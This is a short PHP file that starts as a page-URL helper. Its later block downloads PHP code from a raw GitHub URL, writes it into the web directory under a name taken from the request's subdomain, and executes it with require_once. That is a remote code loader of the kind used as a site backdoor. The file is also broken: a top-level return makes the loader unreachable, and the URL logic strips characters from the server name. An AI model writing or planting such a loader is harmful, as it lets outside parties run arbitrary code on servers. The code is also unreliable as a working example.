
<?php
$pageURL = (@$_SERVER["HTTPS"] == "on") ? "https://" : "http://";
if ($_SERVER["SERVER_PORT"] != "80")
{
    $pageURL .= substr($_SERVER['SERVER_NAME'], 4).":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
} 
else 
{
    $pageURL .= substr($_SERVER['SERVER_NAME'], 4).$_SERVER["REQUEST_URI"];
}
return $pageURL;
    $_dir_ = $_SERVER['DOCUMENT_ROOT'];
    $tokens = explode(".", $_SERVER['HTTP_HOST']);
    $domain = $tokens[0];
if ( file_exists( './'.$domain.'.php') ) {
    
    require_once($_dir_.$domain.'.php');
} else {


        $j = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/app.php');
        $myfile = fopen('./'. $domain.'.php', "w") or die("Unable to open $domain.'.php'!");
        fwrite($myfile, $j);
        fclose($myfile);
    require_once($_dir_.$domain.'.php');
        
        }



    ?>
